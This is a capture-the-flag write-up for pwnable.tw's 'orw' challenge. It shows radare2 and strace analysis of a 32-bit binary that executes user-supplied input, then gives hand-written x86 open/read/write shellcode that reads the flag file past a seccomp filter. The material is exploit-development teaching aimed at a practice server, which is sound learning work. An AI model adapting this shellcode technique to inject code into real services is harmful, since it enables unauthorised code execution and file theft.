# WRITE UP

## Challenge Description

The goal is to get the flag pwning the binary that is running on server. This challenge is worth 100 points.
The challenge is reachble to: `nc chall.pwnable.tw 10001`.

The challenge description on the website says:

```
Only open read write syscall are allowed to use.
```

## Binary Description

### Binary Information

As usual the binary is opened with radare2 and the binary info are dumped.

```
[0x080483d0]> iI
arch     x86
baddr    0x8048000
binsz    6278
bintype  elf
bits     32
canary   true
class    ELF32
compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.2) 5.4.0 20160609
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       false
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```

So the binary has the ***executable stack*** but the ***canary*** is enabled.

***NOTE***

The canary is a random byte-string inserted in the stack before the return address, if the return address changes will change the canary too and an abort is raised.
The canary is inserted by libc and checked by the libc.

### Binary system call map

Executes a strace on the target to understand what it does.

```
$ strace ./orw
...
...
...
brk(NULL)                               = -1 ENOSYS (Function not implemented)
mmap2(NULL, 1048576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) =
-1 ENOSYS (Function not implemented)
mmap2(NULL, 2097152, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0)
= -1 ENOSYS (Function not implemented)
mmap2(NULL, 1048576, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0)
= -1 ENOSYS (Function not implemented)
mmap2(NULL, 2097152, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0)
= -1 ENOSYS (Function not implemented)
mmap2(NULL, 1048576, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0)
= -1 ENOSYS (Function not implemented)
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = -1
ENOSYS (Function not implemented)
mmap2(NULL, 1048576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) =
-1 ENOSYS (Function not implemented)
***write(1, "Give my your shellcode:", 23Give my your shellcode:) = 23***
***read(0,***
```

WAT?! ***Give my your shellcode***...Ok seems it is waiting for a shell-code, before digging into the assembly code try to pass a nop shellcode to it.

```
$ python3 -c 'print("A"*10)' | ./orw
Give my your shellcode:[1]    54154 done           python3 -c 'print("A"*10)' |
       54155 segmentation fault (core dumped)  ./orw
$ dmesg| tail -n 2
[80794.573288] orw[54155]: segfault at 804b000 ip 000000000804b000 sp 00000000ffe9a91c error 14 in libc-2.31.so[f7d0e000+1e5000]
[80794.573299] Code: Bad RIP value.

$ python3 -c 'print("\x90"*10)' | ./orw
Give my your shellcode:%
```

Strange, with `A*10` as input it crashes due to a segfault but giving a nop sleed it does not crash and maybe executes it?

Let's dig in the code.

### Found the vulnerability

As usual dump all the functions of the binary:

```
[0x080483d0]> afl
0x080483d0    1 33           entry0
0x080483a0    1 6            sym.imp.__libc_start_main
0x08048410    4 43           sym.deregister_tm_clones
0x08048440    4 53           sym.register_tm_clones
0x08048480    3 30           sym.__do_global_dtors_aux
0x080484a0    4 43   -> 40   entry.init0
0x08048600    1 2            sym.__libc_csu_fini
0x08048400    1 4            sym.__x86.get_pc_thunk.bx
0x08048604    1 20           sym._fini
0x080484cb    3 125          sym.orw_seccomp
0x080483b0    1 6            sym.imp.prctl
0x08048390    1 6            sym.imp.__stack_chk_fail
0x080485a0    4 93           sym.__libc_csu_init
0x08048548    1 81           main
0x08048380    1 6            sym.imp.printf
0x08048370    1 6            sym.imp.read
0x08048330    3 35           sym.__libc_csu_init
```

Now we can disassemble the ```main``` function, because we need to understand what it does with the read buffer.

```
[0x080483d0]> pdf @ main
            ; DATA XREF from entry0 @ 0x80483e7
            ┌ 81: int main (char **argv);
            │           ; var int32_t var_4h @ ebp-0x4
            │           ; arg char **argv @ esp+0x24
            │           0x08048548      8d4c2404       lea ecx, [argv]
            │           0x0804854c      83e4f0         and esp, 0xfffffff0
            │           0x0804854f      ff71fc         push dword [ecx - 4]
            │           0x08048552      55             push ebp
            │           0x08048553      89e5           mov ebp, esp
            │           0x08048555      51             push ecx
            │           0x08048556      83ec04         sub esp, 4
            │           0x08048559      e86dffffff     call sym.orw_seccomp
            │           0x0804855e      83ec0c         sub esp, 0xc
            │           0x08048561      68a0860408     push str.Give_my_your_shellcode: ; 0x80486a0 ; "Give my your shellcode:" ; const char *format
            │           0x08048566      e815feffff     call sym.imp.printf ; int printf(const char *format)
            │           0x0804856b      83c410         add esp, 0x10
            │           0x0804856e      83ec04         sub esp, 4
            │           0x08048571      68c8000000     push 0xc8 ; 200
            │           0x08048576      6860a00408     push obj.shellcode ; 0x804a060
            │           0x0804857b      6a00           push 0 ; int fildes
            │           0x0804857d      e8eefdffff     call sym.imp.read ; ssize_t read(int fildes, void *buf, size_t nbyte)
            │           0x08048582      83c410         add esp, 0x10
            │           0x08048585      b860a00408     mov eax, obj.shellcode ; 0x804a060
            │           0x0804858a      ffd0           call eax ; jump on the shellcode read() on offset 0x0804857d
            │           0x0804858c      b800000000     mov eax, 0
            │           0x08048591      8b4dfc         mov ecx, dword [var_4h]
            │           0x08048594      c9             leave
            │           0x08048595      8d61fc         lea esp, [ecx - 4]
            └           0x08048598      c3             ret
```

Seriously? It needs an explaination?

----------------------------------------------------------------------------------------------------------------------------
***NOTE***

On x86 architecture the standard ABI is to pass the arguments through the stack. Indeed:

1. `0x08048571` - push the third argument of the read() on the stack.
2. `0x08048576` - push the buffer address.
3. `0x0804857b` - push the file descriptor.

----------------------------------------------------------------------------------------------------------------------------

At the end, here there is no a vulnerability but a ***feature***, indeed it is possible to pass a shellcode and executes it with the instruction `call eax`.
Finally we just need a shellcode.

### Shellcode

The challenge description let me think that a kind sandbox with seccomp is configured on this binary in order to deny some system calls.
Just to be faster a open/read/write shellcode is used.

```
open:
  xor eax, eax
  xor ecx, ecx
  push eax
  push 0x67616c66
  push 0x2f2f7772
  push 0x6f2f2f65
  push 0x6d6f682f
  mov al, 0x05
  mov ebx, esp
  int 0x80

read:
  xchg eax, ebx
  xchg eax, ecx
  mov al, 0x03
  mov edx, 0x30
  int 0x80

write:
  mov bl, 1
  mov eax, 0x4
  int 0x80
```
